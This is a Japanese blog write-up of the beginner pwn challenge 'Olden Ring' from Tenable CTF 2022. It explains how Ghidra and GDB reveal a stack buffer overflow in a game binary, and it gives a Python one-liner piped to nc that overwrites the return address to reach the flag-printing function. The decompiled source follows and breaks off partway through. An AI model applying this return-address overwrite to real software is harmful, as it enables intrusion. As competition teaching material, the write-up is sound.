<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Tenable CTF 2022 Writeup &lsquo;Olden Ring&rsquo;[pwn] #  この記事では，CTF (Capture the Flag) オンライン大会の Tenable CTF 2022で取り組んだ問題の解説をおこないます．
Tenable CTFには，研究室のメンバー3名でチームを作って挑戦しました． 私が取り組んだ問題は，pwnの&rsquo;Olden Ring&rsquo;です． ポイントは100ptsと一番低い分類にあたるので，pwn初心者問題だと思われます．
問題 #  netcatで接続するためのリモートサーバのIP,ポート番号の情報と，oldenというファイルが添付されている．
fileコマンドでファイルの内容を調べたところ，64bitのELFバイナリファイルであることはわかりました．
解説 #  ファイルを実行してみる（または，netcatでリモートサーバに接続してみる）と，どうやらコマンドラインのゲームらしいです．（問題名から察するに，ELDEN RING風のゲームなのかも？？） いくつかの説明文とともに，コマンドラインで入力が求められるというものでした．
バイナリファイルをGhidraを使ってデコンパイルした結果，main関数の他にdefeat_frog_guys関数，boss_fight関数があることがわかります．
その他の関数として，どの関数からも呼び出されていないzip_to_end関数があり，flag.txtの内容を出力する処理を行なっています． つまり，最終的にこの関数を実行することができれば，フラグを取得できるはず．
脆弱性を探す上で，ユーザからの入力を受け付けている関数の使い方に誤りがないかをチェックしていきました． すると，fgets関数がバッファサイズを指定して使われていることがわかります．ユーザ入力の格納先はlocal_418 (Ghidraのデコンパイル時に自動生成された変数名) という変数でした．
fgets((char *)&local_418, 0x400, stdin); 変数local_418はローカル変数なので，BOFできればmain関数のreturnアドレス書き換えが可能です． しかし，どうやらこの変数local_418のバッファサイズは0x400はあるようで，fgetsによってBOFできそうには見えませんでした．
main関数内で，変数local_418から0x400バイト分0で埋めることによって初期化しているため，バッファサイズが0x400バイトあることは想定されているようです．
memset(&local_418, 0, 0x400); 変数local_418が利用されている箇所を中心に，他の処理をチェックしてみます．
defeat_frog_guysという関数の引数として変数local_418 (ユーザ文字列のバッファ) が利用されているため，
// local_418が利用されている！ defeat_frog_guys(&local_418, local_14); このdefeat_frog_guys関数では，memcpy等を用いて，データのコピーが行われているようでした． コピーの流れが複雑なため，ソースコードから挙動を理解するのに時間がかかると判断したため，ここからはGDBによってプログラムを実行させながら挙動を把握していきました．
ユーザが入力した文字列は，defeat_frog_guys関数のスタックフレーム内にコピーされているようでした． そこで，ためしに&rsquo;AAAAA&mldr;&lsquo;という長さ0x400の文字列を入力したところ，Segmentation faultが発生し，BOFが発生したことを確認できました！ defeat_frog_guys関数のスタックがBOF可能ということがわかったので，あとはdefeat_frog_guys→mainに戻る際のreturnアドレスを書き換えて，zip_to_end関数の先頭アドレスにすれば完了です．
 zip_to_end関数のアドレス：0x4012b6（ASLR，PIE等のセキュリティ機構はオフになっているのでアドレスは固定でした） returnアドレス書き換えのためのパディングの長さ：0x3f3バイト ２回目のfgetsで入力する数値：199  ２回目のfgetsで入力する数値によって，コピーされる場所が何バイトかずれたりするようで，上記の2と3については， 何度か入力する数値，パディングの長さを変えてGDBを実行しました． GDBではプログラム実行中にブレークポイントを設置して，プログラムのある時点でのスタックの内容を表示することができるため，この機能を使うことでパディングの長さを調整しました． 使用したGDBのコマンドは主に以下のようなものです．"><meta name=theme-color content="#FFFFFF"><meta property="og:title" content="Tenable CTF 2022 Writeup 'Olden Ring'[pwn]"><meta property="og:description" content="Tenable CTF 2022 Writeup &lsquo;Olden Ring&rsquo;[pwn] #  この記事では，CTF (Capture the Flag) オンライン大会の Tenable CTF 2022で取り組んだ問題の解説をおこないます．
Tenable CTFには，研究室のメンバー3名でチームを作って挑戦しました． 私が取り組んだ問題は，pwnの&rsquo;Olden Ring&rsquo;です． ポイントは100ptsと一番低い分類にあたるので，pwn初心者問題だと思われます．
問題 #  netcatで接続するためのリモートサーバのIP,ポート番号の情報と，oldenというファイルが添付されている．
fileコマンドでファイルの内容を調べたところ，64bitのELFバイナリファイルであることはわかりました．
解説 #  ファイルを実行してみる（または，netcatでリモートサーバに接続してみる）と，どうやらコマンドラインのゲームらしいです．（問題名から察するに，ELDEN RING風のゲームなのかも？？） いくつかの説明文とともに，コマンドラインで入力が求められるというものでした．
バイナリファイルをGhidraを使ってデコンパイルした結果，main関数の他にdefeat_frog_guys関数，boss_fight関数があることがわかります．
その他の関数として，どの関数からも呼び出されていないzip_to_end関数があり，flag.txtの内容を出力する処理を行なっています． つまり，最終的にこの関数を実行することができれば，フラグを取得できるはず．
脆弱性を探す上で，ユーザからの入力を受け付けている関数の使い方に誤りがないかをチェックしていきました． すると，fgets関数がバッファサイズを指定して使われていることがわかります．ユーザ入力の格納先はlocal_418 (Ghidraのデコンパイル時に自動生成された変数名) という変数でした．
fgets((char *)&local_418, 0x400, stdin); 変数local_418はローカル変数なので，BOFできればmain関数のreturnアドレス書き換えが可能です． しかし，どうやらこの変数local_418のバッファサイズは0x400はあるようで，fgetsによってBOFできそうには見えませんでした．
main関数内で，変数local_418から0x400バイト分0で埋めることによって初期化しているため，バッファサイズが0x400バイトあることは想定されているようです．
memset(&local_418, 0, 0x400); 変数local_418が利用されている箇所を中心に，他の処理をチェックしてみます．
defeat_frog_guysという関数の引数として変数local_418 (ユーザ文字列のバッファ) が利用されているため，
// local_418が利用されている！ defeat_frog_guys(&local_418, local_14); このdefeat_frog_guys関数では，memcpy等を用いて，データのコピーが行われているようでした． コピーの流れが複雑なため，ソースコードから挙動を理解するのに時間がかかると判断したため，ここからはGDBによってプログラムを実行させながら挙動を把握していきました．
ユーザが入力した文字列は，defeat_frog_guys関数のスタックフレーム内にコピーされているようでした． そこで，ためしに&rsquo;AAAAA&mldr;&lsquo;という長さ0x400の文字列を入力したところ，Segmentation faultが発生し，BOFが発生したことを確認できました！ defeat_frog_guys関数のスタックがBOF可能ということがわかったので，あとはdefeat_frog_guys→mainに戻る際のreturnアドレスを書き換えて，zip_to_end関数の先頭アドレスにすれば完了です．
 zip_to_end関数のアドレス：0x4012b6（ASLR，PIE等のセキュリティ機構はオフになっているのでアドレスは固定でした） returnアドレス書き換えのためのパディングの長さ：0x3f3バイト ２回目のfgetsで入力する数値：199  ２回目のfgetsで入力する数値によって，コピーされる場所が何バイトかずれたりするようで，上記の2と3については， 何度か入力する数値，パディングの長さを変えてGDBを実行しました． GDBではプログラム実行中にブレークポイントを設置して，プログラムのある時点でのスタックの内容を表示することができるため，この機能を使うことでパディングの長さを調整しました． 使用したGDBのコマンドは主に以下のようなものです．"><meta property="og:type" content="article"><meta property="og:url" content="https://www.kaytaka.com/posts/tenable-pwnable/"><meta property="article:section" content="posts"><meta property="article:modified_time" content="2022-06-28T22:02:16+09:00"><title>Tenable CTF 2022 Writeup 'Olden Ring'[pwn] | k-taka</title><link rel=manifest href=https://www.kaytaka.com/manifest.json><link rel=icon href=https://www.kaytaka.com/favicon.png type=image/x-icon><link rel=stylesheet href=https://www.kaytaka.com/book.min.e246e6a45b940b6ff71d8216783f10a80d910290a7c364c8bfd5d305d8545d62.css integrity="sha256-4kbmpFuUC2/3HYIWeD8QqA2RApCnw2TIv9XTBdhUXWI="><script defer src=https://www.kaytaka.com/en.search.min.4c148fe52ce51b0f6f3eafa50849229a2676e32e9187e82481e541fa962d7ebe.js integrity="sha256-TBSP5SzlGw9vPq+lCEkimiZ24y6Rh+gkgeVB+pYtfr4="></script><script defer src=https://www.kaytaka.com/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk="></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a href=https://www.kaytaka.com/><span>k-taka</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=https://github.com/alex-shpak/hugo-book target=_blank rel=noopener>Github</a></li><li><a href=https://themes.gohugo.io/hugo-book/ target=_blank rel=noopener>Hugo Themes</a></li></ul></nav><script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=https://www.kaytaka.com/svg/menu.svg class=book-icon alt=Menu></label>
<strong>Tenable CTF 2022 Writeup 'Olden Ring'[pwn]</strong>
<label for=toc-control><img src=https://www.kaytaka.com/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#tenable-ctf-2022-writeup-olden-ringpwn>Tenable CTF 2022 Writeup &lsquo;Olden Ring&rsquo;[pwn]</a><ul><li><a href=#問題>問題</a></li><li><a href=#解説>解説</a></li><li><a href=#所感>所感</a></li><li><a href=#配布されたバイナリのデコンパイル結果>配布されたバイナリのデコンパイル結果</a></li></ul></li></ul></nav></aside></header><article class=markdown><h1><a href=https://www.kaytaka.com/posts/tenable-pwnable/>Tenable CTF 2022 Writeup 'Olden Ring'[pwn]</a></h1><h1 id=tenable-ctf-2022-writeup-olden-ringpwn>Tenable CTF 2022 Writeup &lsquo;Olden Ring&rsquo;[pwn]
<a class=anchor href=#tenable-ctf-2022-writeup-olden-ringpwn>#</a></h1><p>この記事では，CTF (Capture the Flag) オンライン大会の
<a href=https://tenable.ctfd.io/scoreboard>Tenable CTF 2022</a>で取り組んだ問題の解説をおこないます．</p><p>Tenable CTFには，研究室のメンバー3名でチームを作って挑戦しました．
私が取り組んだ問題は，pwnの&rsquo;Olden Ring&rsquo;です．
ポイントは100ptsと一番低い分類にあたるので，pwn初心者問題だと思われます．</p><h2 id=問題>問題
<a class=anchor href=#%e5%95%8f%e9%a1%8c>#</a></h2><p>netcatで接続するためのリモートサーバのIP,ポート番号の情報と，oldenというファイルが添付されている．</p><p>fileコマンドでファイルの内容を調べたところ，64bitのELFバイナリファイルであることはわかりました．</p><h2 id=解説>解説
<a class=anchor href=#%e8%a7%a3%e8%aa%ac>#</a></h2><p>ファイルを実行してみる（または，netcatでリモートサーバに接続してみる）と，どうやらコマンドラインのゲームらしいです．（問題名から察するに，ELDEN RING風のゲームなのかも？？）
いくつかの説明文とともに，コマンドラインで入力が求められるというものでした．</p><p>バイナリファイルをGhidraを使ってデコンパイルした結果，main関数の他にdefeat_frog_guys関数，boss_fight関数があることがわかります．</p><p>その他の関数として，どの関数からも呼び出されていない<code>zip_to_end</code>関数があり，flag.txtの内容を出力する処理を行なっています．
つまり，最終的にこの関数を実行することができれば，フラグを取得できるはず．</p><p>脆弱性を探す上で，ユーザからの入力を受け付けている関数の使い方に誤りがないかをチェックしていきました．
すると，fgets関数がバッファサイズを指定して使われていることがわかります．ユーザ入力の格納先は<code>local_418</code> (Ghidraのデコンパイル時に自動生成された変数名) という変数でした．</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>fgets((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418, <span style=color:#ae81ff>0x400</span>, stdin);
</code></pre></div><p>変数local_418はローカル変数なので，BOFできればmain関数のreturnアドレス書き換えが可能です．
しかし，どうやらこの変数local_418のバッファサイズは0x400はあるようで，fgetsによってBOFできそうには見えませんでした．</p><p>main関数内で，変数local_418から0x400バイト分0で埋めることによって初期化しているため，バッファサイズが0x400バイトあることは想定されているようです．</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>memset(<span style=color:#f92672>&amp;</span>local_418, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x400</span>);
</code></pre></div><p>変数local_418が利用されている箇所を中心に，他の処理をチェックしてみます．</p><p>defeat_frog_guysという関数の引数として変数local_418 (ユーザ文字列のバッファ) が利用されているため，</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>// local_418が利用されている！
</span><span style=color:#75715e></span>defeat_frog_guys(<span style=color:#f92672>&amp;</span>local_418, local_14);
</code></pre></div><p>このdefeat_frog_guys関数では，memcpy等を用いて，データのコピーが行われているようでした．
コピーの流れが複雑なため，ソースコードから挙動を理解するのに時間がかかると判断したため，ここからはGDBによってプログラムを実行させながら挙動を把握していきました．</p><p>ユーザが入力した文字列は，defeat_frog_guys関数のスタックフレーム内にコピーされているようでした．
そこで，ためしに&rsquo;AAAAA&mldr;&lsquo;という長さ0x400の文字列を入力したところ，<code>Segmentation fault</code>が発生し，BOFが発生したことを確認できました！
defeat_frog_guys関数のスタックがBOF可能ということがわかったので，あとはdefeat_frog_guys→mainに戻る際のreturnアドレスを書き換えて，zip_to_end関数の先頭アドレスにすれば完了です．</p><ol><li>zip_to_end関数のアドレス：0x4012b6（ASLR，PIE等のセキュリティ機構はオフになっているのでアドレスは固定でした）</li><li>returnアドレス書き換えのためのパディングの長さ：0x3f3バイト</li><li>２回目のfgetsで入力する数値：199</li></ol><p>２回目のfgetsで入力する数値によって，コピーされる場所が何バイトかずれたりするようで，上記の2と3については，
何度か入力する数値，パディングの長さを変えてGDBを実行しました．
GDBではプログラム実行中にブレークポイントを設置して，プログラムのある時点でのスタックの内容を表示することができるため，この機能を使うことでパディングの長さを調整しました．
使用したGDBのコマンドは主に以下のようなものです．</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>// ブレークポイントを設置する
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> break 0x400000

// 現在のスタックtopから40x8バイト分のデータを表示する．
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/40gx $rsp 
</code></pre></div><p>最終的に，以下のコマンドを実行することでexploitコードが出力されます．
これをリモートサーバのプログラムの入力として与えることでフラグが手に入ります．</p><pre><code>python3 -c &quot;print('A'  * 0x3f3 + '\xb6\x12\x40\x00\x00\x00\x00\x00' + '199')&quot; | nc xxx.xxx.xxx.xxx 8000
</code></pre><h2 id=所感>所感
<a class=anchor href=#%e6%89%80%e6%84%9f>#</a></h2><p>久しぶりに参加したため，脆弱性の探し方，GDB等のツールの使い方を思い出すという作業から始まりました．
定期的に手を動かして問題を解かないとすぐ忘れていくものだなと痛感しました．
これからチームメンバーも増やして定期的にCTF大会に参加したいと思っています．</p><h2 id=配布されたバイナリのデコンパイル結果>配布されたバイナリのデコンパイル結果
<a class=anchor href=#%e9%85%8d%e5%b8%83%e3%81%95%e3%82%8c%e3%81%9f%e3%83%90%e3%82%a4%e3%83%8a%e3%83%aa%e3%81%ae%e3%83%87%e3%82%b3%e3%83%b3%e3%83%91%e3%82%a4%e3%83%ab%e7%b5%90%e6%9e%9c>#</a></h2><p>Ghidraを使って，C言語のソースコードにデコンパイルした結果です．
主要な関数のみを記載しています．</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined8 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
{
    <span style=color:#66d9ef>long</span> lVar1;
    undefined8 <span style=color:#f92672>*</span>puVar2;
    <span style=color:#66d9ef>char</span> local_420[<span style=color:#ae81ff>8</span>];
    undefined8 local_418;
    undefined8 local_410;
    undefined8 local_408[<span style=color:#ae81ff>126</span>];
    uint local_14;
    ulong local_10;

    local_10 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    local_418 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    local_410 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    puVar2 <span style=color:#f92672>=</span> local_408;
    <span style=color:#66d9ef>for</span> (lVar1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7e</span>; lVar1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>; lVar1 <span style=color:#f92672>=</span> lVar1 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
    {
        <span style=color:#f92672>*</span>puVar2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
        puVar2 <span style=color:#f92672>=</span> puVar2 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
    }
    memset(<span style=color:#f92672>&amp;</span>local_418, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x400</span>);
    printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>[0;33m&#34;</span>);
    printf(<span style=color:#f92672>&amp;</span>DAT_00402488);
    printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>[0m&#34;</span>);
    putchar(<span style=color:#ae81ff>10</span>);
    puts(
        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>You are on your way to becoming the Olden Lord, but first you must collect rings by defea ting many (many many) frog-guys!&#34;</span>);
    printf(<span style=color:#e6db74>&#34;The rings will let you become powerful enough to face the final boss!&#34;</span>);
    printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>First things first: What</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>s your name?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>);
    fgets((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_418, <span style=color:#ae81ff>0x400</span>, stdin);
    puts(<span style=color:#f92672>&amp;</span>DAT_00402ca0);
    puts(<span style=color:#e6db74>&#34;--------------------</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Fig a. A Frog-guy</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>--------------------&#34;</span>);
    <span style=color:#66d9ef>while</span> (local_10 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>5000</span>)
    {
        printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>=============================================================================&#34;</span>);
        puts(
            <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>From atop a hill, overlooking a lake of red, you see a field of 250 frog-guys just kind a hanging out, not bothering anyone.&#34;</span>);
        printf(<span style=color:#e6db74>&#34;How many do you defeat to gather their rings?</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&gt; &#34;</span>);
        fgets(local_420, <span style=color:#ae81ff>8</span>, stdin);
        local_14 <span style=color:#f92672>=</span> atoi(local_420);
        <span style=color:#66d9ef>if</span> ((<span style=color:#66d9ef>int</span>)local_14 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
        {
            printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>You...create? frog-guys? Don</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>t do that&#34;</span>);
        }
        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (local_14 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
        {
            puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>You spare all the frog-guys. Admirable.&#34;</span>);
        }
        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> ((<span style=color:#66d9ef>int</span>)local_14 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0xfb</span>)
        {
            printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>You set about your noble work of defeating %d nearly-defenseless, chillin</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74> frog-guy s</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>, (ulong)local_14);
            defeat_frog_guys(<span style=color:#f92672>&amp;</span>local_418, local_14);
            puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>You rest to allow some frog-guys to reconvene.&#34;</span>);
            local_10 <span style=color:#f92672>=</span> local_10 <span style=color:#f92672>+</span> (<span style=color:#66d9ef>long</span>)(<span style=color:#66d9ef>int</span>)local_14;
        }
        <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>0xfa</span> <span style=color:#f92672>&lt;</span> (<span style=color:#66d9ef>int</span>)local_14)
        {
            puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Whoa now, we know you</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>re excited, but there aren</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>t that many in this field.&#34;</span>);
        }
    }
    boss_fight();
    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>defeat_frog_guys</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>param_1, <span style=color:#66d9ef>int</span> param_2)

{
    <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>__src;
    <span style=color:#66d9ef>int</span> iVar1;
    size_t sVar2;
    <span style=color:#66d9ef>long</span> lVar3;
    undefined <span style=color:#f92672>**</span>ppuVar4;
    undefined8 <span style=color:#f92672>*</span>puVar5;
    <span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>ppvVar6;
    byte bVar7;
    <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>local_b48[<span style=color:#ae81ff>100</span>];
    undefined8 local_828;
    undefined8 local_820;
    undefined8 local_818[<span style=color:#ae81ff>255</span>];
    <span style=color:#66d9ef>int</span> local_1c;

    bVar7 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    local_828 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    local_820 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    puVar5 <span style=color:#f92672>=</span> local_818;
    <span style=color:#66d9ef>for</span> (lVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xfe</span>; lVar3 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>; lVar3 <span style=color:#f92672>=</span> lVar3 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
    {
        <span style=color:#f92672>*</span>puVar5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
        puVar5 <span style=color:#f92672>=</span> puVar5 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
    }
    memset(<span style=color:#f92672>&amp;</span>local_828, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x400</span>);
    ppuVar4 <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>PTR_DAT_0040d0a0;
    ppvVar6 <span style=color:#f92672>=</span> local_b48;
    <span style=color:#66d9ef>for</span> (lVar3 <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>; lVar3 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>; lVar3 <span style=color:#f92672>=</span> lVar3 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
    {
        <span style=color:#f92672>*</span>ppvVar6 <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>ppuVar4;
        ppuVar4 <span style=color:#f92672>=</span> ppuVar4 <span style=color:#f92672>+</span> (ulong)bVar7 <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
        ppvVar6 <span style=color:#f92672>=</span> ppvVar6 <span style=color:#f92672>+</span> (ulong)bVar7 <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
    }
    sVar2 <span style=color:#f92672>=</span> strlen((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_828);
    memcpy((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>long</span>)<span style=color:#f92672>&amp;</span>local_828 <span style=color:#f92672>+</span> sVar2), <span style=color:#e6db74>&#34;You defeat the following frog-guys:&#34;</span>, <span style=color:#ae81ff>0x24</span>);
    <span style=color:#66d9ef>for</span> (local_1c <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; local_1c <span style=color:#f92672>&lt;</span> param_2; local_1c <span style=color:#f92672>=</span> local_1c <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
    {
        iVar1 <span style=color:#f92672>=</span> rand();
        __src <span style=color:#f92672>=</span> local_b48[iVar1 <span style=color:#f92672>%</span> <span style=color:#ae81ff>99</span>];
        sVar2 <span style=color:#f92672>=</span> strlen((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_828);
        memcpy((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>long</span>)<span style=color:#f92672>&amp;</span>local_828 <span style=color:#f92672>+</span> sVar2), __src, <span style=color:#ae81ff>5</span>);
        sVar2 <span style=color:#f92672>=</span> strlen((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_828);
        memcpy((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>long</span>)<span style=color:#f92672>&amp;</span>local_828 <span style=color:#f92672>+</span> sVar2), <span style=color:#f92672>&amp;</span>DAT_00402444, <span style=color:#ae81ff>2</span>);
    }
    sVar2 <span style=color:#f92672>=</span> strlen((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_828);
    memcpy((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>long</span>)<span style=color:#f92672>&amp;</span>local_828 <span style=color:#f92672>+</span> sVar2), <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>Frog-guys across the land will fear the name &#34;</span>, <span style=color:#ae81ff>0x32</span>);
    sVar2 <span style=color:#f92672>=</span> strlen((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>local_828);
    memcpy((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>long</span>)<span style=color:#f92672>&amp;</span>local_828 <span style=color:#f92672>+</span> sVar2), param_1, <span style=color:#ae81ff>0x400</span>);
    printf(<span style=color:#e6db74>&#34;%s&#34;</span>, <span style=color:#f92672>&amp;</span>local_828);
    <span style=color:#66d9ef>return</span>;
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>boss_fight</span>(<span style=color:#66d9ef>void</span>)

{
    puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Dang, you must be like...really really powerful. Ok, you uh...how</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>d you get here?&#34;</span>);
    puts(
        <span style=color:#e6db74>&#34;You try to fight the boss, but your build has been nerfed in a patch, and you get one-shotted  almost instantly.&#34;</span>);
    printf(<span style=color:#e6db74>&#34;You die. Enjoy fighting your way here again.&#34;</span>);
    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
    exit(<span style=color:#ae81ff>0</span>);
}

<span style=color:#75715e>// zip_to_end関数の先頭アドレス：0x00000000004012b6
</span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>zip_to_end</span>(<span style=color:#66d9ef>void</span>)

{
    <span style=color:#66d9ef>int</span> iVar1;
    <span style=color:#66d9ef>char</span> local_128[<span style=color:#ae81ff>272</span>];
    FILE <span style=color:#f92672>*</span>local_18;
    <span style=color:#66d9ef>char</span> local_9;

    puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>You do some weird thing by blocking and timing frames!!!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
    puts(
        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>You arrive at the secret final boss!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Quick! Choose your tactic to defeat it before being o ne-shotted!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
    puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>1) FROSTY STOMP!!!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>2) FROSTY STOMP!!!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>3) FROSTY STOMP!!!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
    fgets(local_128, <span style=color:#ae81ff>0x102</span>, stdin);
    puts(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Good Strategy!!! You win! You</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>re now the Olden Lord!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
    local_18 <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;/home/ctf/flag.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>);
